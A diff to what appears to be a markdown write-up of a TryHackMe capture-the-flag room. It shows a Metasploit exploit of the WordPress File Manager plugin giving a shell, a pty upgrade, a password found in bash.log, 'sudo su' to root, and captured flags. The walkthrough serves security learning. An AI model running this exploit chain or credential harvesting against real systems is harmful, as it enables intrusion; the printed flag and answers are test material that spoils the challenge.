@@ -302,23 +302,32 @@ msf6 exploit(multi/http/wp_file_manager_rce) > run
 meterpreter > shell
 Process 3250 created.
 Channel 0 created.
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+<ress/wp-content/plugins/wp-file-manager/lib/files$ whoami
 whoami
 cth
-pwd
-/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files
+<ress/wp-content/plugins/wp-file-manager/lib/files$ ls -lah
+ls -lah
+total 20K
+drwxr-xr-x  5 cth cth 4.0K Feb  7 20:31 .
+drwxr-xr-x 12 cth cth 4.0K Mar 23  2021 ..
+-rw-r--r--  1 cth cth    0 Mar 23  2021 .gitkeep
+drwxr-xr-x  2 cth cth 4.0K Mar 23  2021 .quarantine
+drwxr-xr-x  2 cth cth 4.0K Mar 23  2021 .tmb
+drwxr-xr-x  3 cth cth 4.0K Mar 23  2021 .trash
+<ress/wp-content/plugins/wp-file-manager/lib/files$ cd /home
 cd /home
+cth@...:/home$ ls
 ls
-cth
-errorcauser
-ubuntu
+cth  errorcauser  ubuntu
+cth@...:/home$ cd cth
 cd cth
+cth@...:/home/cth$ ls
 ls
 user.txt
+cth@...:/home/cth$ cat user.txt
 cat user.txt
 THM{227906201d17d9c45aa93d0122ea1af7}
-
-
-
 ```
 
 
@@ -327,10 +336,74 @@ THM{227906201d17d9c45aa93d0122ea1af7}
 
 <br>
 <br>
-
-
-<br>
-<br>
-
 <h2>Task 6 . Privilege Escalation</h2>
+
+<br>
+
+<p><em>Answer the questions below</em></p>
+
+<p>6.1. <em>What is the user's old password?</em><br>
+<code>wordpress</code></p>
+
+<p>6.2. <em>What protocols are used for these ports?</em><br>
+<code>THM{••••••••••••••••••••••••••••••••}</code></p>
+
+G00dP@$sw0rd2021
+
+```bash
+cth@...:/home/cth$ cd /var
+cd /var
+cth@...:/var$ cd log
+cd log
+cth@...:/var/log$ cat bash.log
+```
+
+<img width="1187" height="755" alt="image" src="https://github.com/user-attachments/assets/2137e6d0-0b4f-4ebc-87fa-b8ff75debcaf" />
+
+<br>
+<br>
+
+```bash
+cth@...:/var/log$ sudo su
+sudo su
+[sudo] password for cth: G00dP@$sw0rd2021
+
+root@...:/var/log# cd /root
+cd /root
+root@...:~# ls
+ls
+root.txt
+root@...:~# cat root.txt
+cat root.txt
+  |      ______    ________   ________              ______        _____________ __________  |
+  |     / ____ \  /  ___   \ /   ____ \            / ____ \      /____    ____//   ______/\ |
+  |    / /___/_/ /  /__/   //   /   / /\          / /___/_/      \___/   /\___/   /______\/ |
+  |   / _____ \ /  ____   //   /   / / /         / _____ \ __   ___ /   / /  /   ____/\     |
+  |  / /____/ //  / __/  //   /___/ / /         / /____/ //  | /  //   / /  /   /____\/     |
+  | /________//__/ / /__//_________/ /         /________/ |  \/  //___/ /  /   /________    |
+  | \________\\__\/  \__\\_________\/          \________\  \    / \___\/  /____________/\   | 
+  |                                  _________           __/   / /        \____________\/   |
+  |                                 /________/\         /_____/ /                           |
+  |                                 \________\/         \_____\/                            |
+
+THM{••••••••••••••••••••••••••••••••}
+
+ ________________________
+< Made with \u2764 by BadByte >
+ ------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+root@...:~# 
+```
+
+<img width="1190" height="683" alt="image" src="https://github.com/user-attachments/assets/2d575554-1727-4cbc-aa19-f84ad4943d7e" />
+
+<br>
+<br>
+
+<h1>Completed</h1>
+
 
